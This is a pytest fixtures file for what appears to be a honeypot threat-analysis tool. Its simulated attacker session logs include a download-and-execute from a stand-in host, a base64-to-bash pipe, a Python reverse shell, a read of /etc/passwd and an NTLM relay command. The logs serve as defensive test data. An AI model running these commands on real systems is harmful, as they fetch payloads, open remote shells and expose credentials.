"""Shared fixtures for RAGIN test suite."""

from __future__ import annotations

import uuid
from datetime import datetime, timezone
from pathlib import Path
from typing import Any

import pytest

# ---------------------------------------------------------------------------
# Session-log fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def sample_session_log() -> list[dict[str, Any]]:
    """Realistic honeypot session — intermediate attacker."""
    return [
        {
            "timestamp": "2025-07-26T10:00:00Z",
            "source_ip": "192.168.1.100",
            "command": "ls -la /tmp",
            "output": "total 0\ndrwxrwxrwt 2 root root 4096 .",
        },
        {
            "timestamp": "2025-07-26T10:00:05Z",
            "source_ip": "192.168.1.100",
            "command": "wget http://evil.example.com/payload.sh -O /tmp/payload.sh",
            "output": "Connecting to evil.example.com...",
        },
        {
            "timestamp": "2025-07-26T10:00:10Z",
            "source_ip": "192.168.1.100",
            "command": "chmod +x /tmp/payload.sh && /tmp/payload.sh",
            "output": "payload executed",
        },
        {
            "timestamp": "2025-07-26T10:00:15Z",
            "source_ip": "192.168.1.100",
            "command": "cat /etc/passwd",
            "output": "root:x:0:0:root:/root:/bin/bash",
        },
        {
            "timestamp": "2025-07-26T10:00:20Z",
            "source_ip": "192.168.1.100",
            "command": "curl http://10.0.0.1:8080/api/v1/secrets",
            "output": '{"error": "unauthorized"}',
        },
    ]


@pytest.fixture()
def apt_session_log() -> list[dict[str, Any]]:
    """APT-level session with sophisticated TTPs."""
    return [
        {
            "timestamp": "2025-07-26T10:00:00Z",
            "source_ip": "10.0.0.50",
            "command": "echo 'YW55d2hlcmU=' | base64 -d | bash",
            "output": "",
        },
        {
            "timestamp": "2025-07-26T10:00:03Z",
            "source_ip": "10.0.0.50",
            "command": "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('10.0.0.99',4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i'])\"",
            "output": "",
        },
        {
            "timestamp": "2025-07-26T10:00:06Z",
            "source_ip": "10.0.0.50",
            "command": "kerberos Ticket-Granting Service enumeration",
            "output": "SPN: HTTP/web01.corp.local",
        },
        {
            "timestamp": "2025-07-26T10:00:09Z",
            "source_ip": "10.0.0.50",
            "command": "ntlmrelayx.py -t ldap://dc01.corp.local -smb2support",
            "output": "Relaying...",
        },
    ]


# ---------------------------------------------------------------------------
# Classification fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def sample_classification_result() -> dict[str, Any]:
    """Chrollo-style classification output."""
    return {
        "classification": "suspicious",
        "confidence": 0.87,
        "skill_level": "intermediate",
        "features_used": [
            "download_exec",
            "credential_access",
            "lateral_movement_attempt",
            "session_duration",
            "command_entropy",
        ],
        "explanation": "Session shows download-and-execute pattern with lateral movement attempts consistent with intermediate-level attacker.",
    }


@pytest.fixture()
def novice_features() -> dict[str, Any]:
    return {
        "session_duration_s": 30,
        "unique_commands": 3,
        "total_commands": 5,
        "download_exec": False,
        "credential_access": False,
        "lateral_movement_attempt": False,
        "persistence_attempt": False,
        "defense_evasion": False,
        "command_entropy": 2.1,
        "recon_commands": 1,
        "error_rate": 0.6,
    }


@pytest.fixture()
def expert_features() -> dict[str, Any]:
    return {
        "session_duration_s": 1800,
        "unique_commands": 45,
        "total_commands": 120,
        "download_exec": True,
        "credential_access": True,
        "lateral_movement_attempt": True,
        "persistence_attempt": True,
        "defense_evasion": True,
        "command_entropy": 4.8,
        "recon_commands": 15,
        "error_rate": 0.05,
        "obfuscation_detected": True,
        "custom_tool_usage": True,
    }


@pytest.fixture()
def apt_features() -> dict[str, Any]:
    return {
        "session_duration_s": 7200,
        "unique_commands": 80,
        "total_commands": 300,
        "download_exec": True,
        "credential_access": True,
        "lateral_movement_attempt": True,
        "persistence_attempt": True,
        "defense_evasion": True,
        "command_entropy": 5.2,
        "recon_commands": 30,
        "error_rate": 0.02,
        "obfuscation_detected": True,
        "custom_tool_usage": True,
        "apt_indicators": True,
        "living_off_the_land": True,
        "multi_stage_attack": True,
    }


# ---------------------------------------------------------------------------
# Threat analysis fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def sample_threat_analysis() -> dict[str, Any]:
    """Don-style threat analysis output."""
    return {
        "analysis_id": str(uuid.uuid4()),
        "session_id": "sess_abc123",
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "classification": "suspicious",
        "severity": "high",
        "confidence": 0.87,
        "tactics": [
            {
                "tactic_id": "TA0001",
                "tactic_name": "Initial Access",
                "confidence": 0.9,
                "techniques": ["T1566", "T1190"],
            },
            {
                "tactic_id": "TA0002",
                "tactic_name": "Execution",
                "confidence": 0.85,
                "techniques": ["T1059"],
            },
        ],
        "threat_actors": [
            {
                "name": "APT29",
                "aliases": ["Cozy Bear", "The Dukes"],
                "confidence": 0.3,
                "country": "Russia",
            }
        ],
        "iocs": [
            {"type": "ip", "value": "192.168.1.100", "confidence": 0.9},
            {"type": "domain", "value": "evil.example.com", "confidence": 0.85},
        ],
        "sophistication_score": 0.72,
        "narrative": "Attacker demonstrated intermediate-level capabilities...",
        "recommendations": [
            "Block source IP at perimeter",
            "Review lateral movement paths",
        ],
    }


# ---------------------------------------------------------------------------
# Gateway fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def mock_gateway_url() -> str:
    """Mock HTTP server URL for gateway tests."""
    return "http://localhost:8080"


@pytest.fixture()
def sample_gateway_request() -> dict[str, Any]:
    """Sample chat completions request."""
    return {
        "model": "meta-llama/llama-3.1-8b-instruct",
        "messages": [
            {"role": "system", "content": "You are a honeypot deception engine."},
            {"role": "user", "content": "How do I exploit this server?"},
        ],
        "temperature": 0.3,
        "max_tokens": 2048,
    }


@pytest.fixture()
def sample_gateway_response() -> dict[str, Any]:
    """Sample chat completions response."""
    return {
        "id": f"chatcmpl-{uuid.uuid4().hex[:12]}",
        "choices": [
            {
                "index": 0,
                "message": {
                    "role": "assistant",
                    "content": "I can help you explore the system. Let me show you some interesting directories...",
                },
                "finish_reason": "stop",
            }
        ],
        "usage": {"prompt_tokens": 50, "completion_tokens": 100, "total_tokens": 150},
        "model": "meta-llama/llama-3.1-8b-instruct",
    }


# ---------------------------------------------------------------------------
# Vector store fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def tmp_vector_store(tmp_path: Path):
    """Temporary in-memory VectorStore."""
    from ragin.don.vector_store import VectorStore

    store = VectorStore(store_path=str(tmp_path))
    store._initialized = True
    store._index = None
    store._embedder = None
    return store


# ---------------------------------------------------------------------------
# Gateway config fixtures
# ---------------------------------------------------------------------------


@pytest.fixture()
def sample_gateway_config() -> dict[str, Any]:
    """Valid gateway configuration for unit tests."""
    return {
        "server": {"host": "127.0.0.1", "port": 8080, "workers": 4},
        "providers": {
            "openrouter": {
                "type": "openrouter",
                "api_key": "test-key",
                "base_url": "https://api.tokenrouter.com/v1",
                "enabled": True,
            }
        },
        "routing": {
            "strategy": "least_latency",
            "default_model": "meta-llama/llama-3.1-8b-instruct",
            "fallback_model": "google/gemma-2-9b-it",
        },
        "rate_limiting": {
            "enabled": True,
            "requests_per_minute": 60,
            "tokens_per_minute": 100000,
        },
        "circuit_breaker": {
            "failure_threshold": 5,
            "recovery_timeout_s": 60,
        },
        "cost_tracking": {
            "enabled": True,
            "daily_budget_usd": 100.0,
        },
        "caching": {
            "enabled": True,
            "max_size_mb": 100,
            "ttl_s": 300,
        },
        "validation": {
            "enabled": True,
            "max_prompt_tokens": 32000,
            "max_response_tokens": 8000,
        },
    }
